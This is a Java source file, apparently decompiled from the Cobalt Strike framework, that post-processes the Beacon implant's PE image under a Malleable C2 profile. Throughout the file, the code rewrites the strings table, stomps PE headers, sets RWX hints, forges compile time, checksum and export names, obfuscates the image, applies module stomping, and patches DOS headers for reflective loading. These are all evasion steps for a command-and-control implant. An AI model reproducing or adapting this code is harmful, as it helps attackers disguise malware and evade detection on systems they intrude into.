package pe;

import c2profile.Profile;
import c2profile.Program;
import c2profile.SmartBuffer;
import common.CommonUtils;

import java.util.Arrays;
import java.util.Iterator;

import pe.BeaconLoader;
import pe.PEEditor;

public class MalleablePE {

    Profile profile;

    public MalleablePE(Profile profile) {
        this.profile = profile;
    }

    public byte[] strings(byte[] arrby) {
        String str = CommonUtils.bString(arrby);
        int i = str.indexOf("TTTTSSSSUUUUVVVVWWWWXXXXYYYYZZZZ");
        if (i == -1) {
            CommonUtils.print_error("new string table not found (MalleablePE)");
            return arrby;
        }
        SmartBuffer smartBuffer = this.profile.getToString(".stage").copy();
        Iterator iterator = smartBuffer.iterator();
        while (iterator.hasNext()) {
            String str1 = CommonUtils.bString((byte[]) iterator.next()).trim();
            if (CommonUtils.isin(str1, str)) {
                iterator.remove();
            }
        }
        byte[] padg = CommonUtils.padg(smartBuffer.getBytes(), 4096);
        if (padg.length > 4096) {
            int j = padg.length;
            padg = Arrays.copyOfRange(padg, 0, 4096);
            CommonUtils.print_warn("Truncated PE strings table to " + padg.length
                    + " bytes from " + j + " bytes");
        }
        str = CommonUtils.replaceAt(str, CommonUtils.bString(padg), i);
        return CommonUtils.toBytes(str);
    }

    public byte[] process(byte[] arrby, String string) {
        arrby = pre_process(arrby, string);
        return post_process(arrby, string);
    }

    public byte[] pre_process(byte[] arrby, String string) {
        arrby = strings(arrby);
        boolean bool1 = this.profile.option(".stage.userwx");
        int i = this.profile.getInt(".stage.image_size_" + string);
        String str1 = this.profile.getString(".stage.compile_time");
        boolean bool2 = this.profile.option(".stage.obfuscate");
        String str2 = this.profile.getString(".stage.name");
        int j = this.profile.getInt(".stage.checksum");
        String str3 = this.profile.getString(".stage.module_" + string);
        boolean bool3 = this.profile.option(".stage.stomppe");
        String str4 = this.profile.getString(".stage.rich_header");
        int k = this.profile.getInt(".stage.entry_point");
        PEEditor pEEditor = new PEEditor(arrby);
        pEEditor.checkAssertions();
        if (!"<DEFAULT>".equals(str4))
            pEEditor.insertRichHeader(CommonUtils.toBytes(str4));
        if (bool3 == true)
            pEEditor.stompPE();
        if (bool1 == true)
            pEEditor.setRWXHint(bool1);
        if (!str1.equals(""))
            pEEditor.setCompileTime(str1);
        if (i > 0)
            pEEditor.setImageSize(i);
        if (j > 0)
            pEEditor.setChecksum(j);
        if (!str2.equals(""))
            pEEditor.setExportName(str2);
        if (k >= 0)
            pEEditor.setEntryPoint(k);
        pEEditor.obfuscate(bool2);
        if (!str3.equals(""))
            pEEditor.setModuleStomp(str3);
        return pEEditor.getImage();
    }

    public byte[] post_process(byte[] arrby, String string) {
        String str;
        byte[] datas;
        if ("x86".equals(string)) {
            datas = BeaconLoader.patchDOSHeader(arrby);
            str = ".stage.transform-x86";
        } else if ("x64".equals(string)) {
            datas = BeaconLoader.patchDOSHeaderX64(arrby);
            str = ".stage.transform-x64";
        } else {
            str = "";
            datas = new byte[0];
        }
        Program program = this.profile.getProgram(str);
        if (program == null) {
            return datas;
        }
        return program.transformData(datas);
    }
}
